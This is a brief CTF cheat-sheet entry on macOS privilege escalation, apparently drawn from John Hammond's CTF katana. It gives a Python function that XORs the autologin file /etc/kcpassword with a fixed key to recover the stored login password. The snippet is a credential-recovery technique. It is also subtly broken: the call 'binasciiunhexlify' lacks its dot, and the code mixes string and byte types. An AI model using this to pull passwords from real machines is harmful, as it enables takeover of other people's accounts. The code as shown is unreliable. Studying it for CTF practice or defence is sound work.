# MacOS Privilege Escalation

[John Hammond's CTF katana](https://github.com/JohnHammond/ctf-katana): Mac autologin password file `/etc/kcpassword`, you can crack it with this code:
```python
def kcpasswd(ciphertext):
    key = '7d895223d2bcddeaa3b91f'
    while len(key) < (len(ciphertext)*2):
        key = key + key
    key = binasciiunhexlify(key)
    result = ''
    for i in range(len(ciphertext)):
        result += chr(ord(ciphertext[i]) ^ (key[i]))
    return result
```



## References

[John Hammond's CTF katana](https://github.com/JohnHammond/ctf-katana)